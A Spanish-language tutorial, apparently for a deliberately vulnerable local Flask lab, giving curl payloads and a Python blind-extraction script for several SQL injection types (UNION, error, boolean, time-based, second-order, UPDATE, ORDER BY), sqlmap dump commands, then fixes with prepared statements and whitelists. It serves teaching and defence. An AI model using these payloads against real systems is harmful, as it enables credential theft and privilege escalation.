# Ejemplos de Explotacion - SQL Injection

Este archivo contiene ejemplos practicos de como explotar cada vulnerabilidad.

**IMPORTANTE**: Estos ejemplos son solo para propositos educativos en un entorno controlado.

## Configuracion Inicial

```bash
# Instalar dependencias
pip install -r requirements.txt

# Inicializar la base de datos
python init_db.py

# Ejecutar la aplicacion
python app.py
```

## 1. UNION-based SQL Injection

### Ataque Basico
```bash
# Ver usuario normal
curl "http://localhost:5000/users?id=1"

# Extraer contraseñas usando UNION
curl "http://localhost:5000/users?id=1 UNION SELECT 1,password,email,role FROM users--"

# Obtener todos los usuarios y contraseñas
curl "http://localhost:5000/users?id=-1 UNION SELECT id,username,password,email FROM users--"
```

### Enumeracion de Tablas (SQLite)
```bash
# Listar todas las tablas
curl "http://localhost:5000/users?id=1 UNION SELECT 1,name,sql,3 FROM sqlite_master WHERE type='table'--"
```

---

## 2. Error-based SQL Injection

### Forzar Errores para Revelar Datos
```bash
# Request normal
curl "http://localhost:5000/search?name=admin"

# Forzar error de conversion para ver contraseña
curl "http://localhost:5000/search?name=admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS INT)--"

# Extraer email
curl "http://localhost:5000/search?name=admin' AND 1=CAST((SELECT email FROM users WHERE id=1) AS INT)--"
```

---

## 3. Boolean-based Blind SQL Injection

### Inferir Datos Bit a Bit
```bash
# Login normal (falla)
curl "http://localhost:5000/login?username=admin&password=wrong"

# Bypass de autenticacion
curl "http://localhost:5000/login?username=admin'--&password=anything"

# Verificar longitud de contraseña (si retorna logged_in: true, la condicion es verdadera)
curl "http://localhost:5000/login?username=admin' AND LENGTH(password)>5--&password=x"
curl "http://localhost:5000/login?username=admin' AND LENGTH(password)>10--&password=x"
curl "http://localhost:5000/login?username=admin' AND LENGTH(password)=8--&password=x"

# Extraer primer caracter de la contraseña
curl "http://localhost:5000/login?username=admin' AND SUBSTR(password,1,1)='a'--&password=x"
curl "http://localhost:5000/login?username=admin' AND SUBSTR(password,1,1)='b'--&password=x"
```

### Script Python para Automatizar Extraccion
```python
import requests

url = "http://localhost:5000/login"
password = ""

for pos in range(1, 20):
    found = False
    for char in "abcdefghijklmnopqrstuvwxyz0123456789":
        payload = f"admin' AND SUBSTR(password,{pos},1)='{char}'--"
        response = requests.get(url, params={"username": payload, "password": "x"})

        if response.json().get("logged_in"):
            password += char
            print(f"Caracter {pos}: {char} -> Password hasta ahora: {password}")
            found = True
            break

    if not found:
        break

print(f"Contraseña completa: {password}")
```

---

## 4. Time-based Blind SQL Injection

### Ataques Basados en Tiempo
```bash
# Request normal
curl "http://localhost:5000/products?category=electronics"

# Test condicional con delay (usando cross join para simular delay en SQLite)
curl "http://localhost:5000/products?category=electronics' AND (SELECT CASE WHEN (1=1) THEN (SELECT COUNT(*) FROM users AS T1, users AS T2, users AS T3) ELSE 1 END)--"

# Verificar longitud de contraseña del admin
curl "http://localhost:5000/products?category=electronics' AND (SELECT CASE WHEN LENGTH((SELECT password FROM users WHERE username='admin'))>5 THEN (SELECT COUNT(*) FROM users AS T1, users AS T2) ELSE 1 END)--"
```

---

## 5. Second-Order SQL Injection

### Inyeccion de Segundo Orden
```bash
# Registrar usuario con payload malicioso
curl -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker'\''--", "email": "hacker@evil.com"}'

# Registrar usuario que modifica otros campos
curl -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username": "test'\'', '\''admin'\'', '\''hacked", "email": "test@test.com"}'
```

---

## 6. UPDATE SQL Injection

### Modificar Multiples Campos
```bash
# Update normal
curl -X POST http://localhost:5000/update_profile \
  -H "Content-Type: application/json" \
  -d '{"user_id": 2, "bio": "Mi bio normal"}'

# Escalar privilegios a admin
curl -X POST http://localhost:5000/update_profile \
  -H "Content-Type: application/json" \
  -d '{"user_id": 2, "bio": "pwned'\'', role='\''admin'\'', password='\''hacked123"}'

# Verificar que el usuario ahora es admin
curl "http://localhost:5000/users?id=2"
```

---

## 7. ORDER BY SQL Injection

### Inyeccion en ORDER BY
```bash
# Order normal
curl "http://localhost:5000/orders?sort=id"

# Inyeccion condicional en ORDER BY
curl "http://localhost:5000/orders?sort=(SELECT CASE WHEN (1=1) THEN id ELSE user_id END)"

# Extraer datos usando ORDER BY
curl "http://localhost:5000/orders?sort=(SELECT CASE WHEN (SELECT LENGTH(password) FROM users WHERE id=1)>5 THEN id ELSE user_id END)"
```

---

## Herramientas Automatizadas

### sqlmap

```bash
# Instalar sqlmap
git clone https://github.com/sqlmapproject/sqlmap.git

# Test UNION-based
python sqlmap.py -u "http://localhost:5000/users?id=1" --batch --dump

# Test en POST endpoint
python sqlmap.py -u "http://localhost:5000/update_profile" \
  --data '{"user_id":1,"bio":"test"}' \
  --method POST \
  --headers="Content-Type: application/json" \
  --batch

# Extraer toda la base de datos
python sqlmap.py -u "http://localhost:5000/users?id=1" --batch --dump-all
```

### Usando Burp Suite

1. Configurar proxy en Burp Suite (puerto 8080)
2. Interceptar request:
```
GET /users?id=1 HTTP/1.1
Host: localhost:5000
```
3. Enviar a Repeater (Ctrl+R)
4. Modificar parametro:
```
GET /users?id=1 UNION SELECT 1,2,3,4-- HTTP/1.1
```
5. Analizar respuesta

---

## Defensa: Como Corregir las Vulnerabilidades

### Codigo Seguro con Prepared Statements

```python
# INSEGURO
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)

# SEGURO
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

### Usando SQLAlchemy (ORM)

```python
from flask_sqlalchemy import SQLAlchemy

db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True)

# Query segura
user = User.query.filter_by(id=user_id).first()
```

### Validacion de Entrada

```python
import re

def validate_id(user_id):
    if not user_id.isdigit():
        raise ValueError("ID invalido")
    return int(user_id)

# Lista blanca para ORDER BY
ALLOWED_SORT_FIELDS = ['id', 'username', 'created_at']
if sort_field not in ALLOWED_SORT_FIELDS:
    sort_field = 'id'
```

---

## Checklist de Seguridad

- [ ] Usar prepared statements SIEMPRE
- [ ] Validar y sanitizar todas las entradas
- [ ] Implementar lista blanca para valores dinamicos
- [ ] Usar ORM cuando sea posible
- [ ] Principio de minimo privilegio en BD
- [ ] Manejo seguro de errores (no revelar informacion)
- [ ] Logs de seguridad
- [ ] Testing de penetracion regular

---

## Recursos para Practicar

- [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
- [PortSwigger SQL Injection Labs](https://portswigger.net/web-security/sql-injection)
- [HackTheBox](https://www.hackthebox.com/)
- [TryHackMe](https://tryhackme.com/)

## Nota Final

Este material es para propositos educativos. Realizar ataques SQL injection contra sistemas sin autorizacion es ILEGAL. Practica solo en ambientes controlados que poseas o tengas permiso explicito para probar.
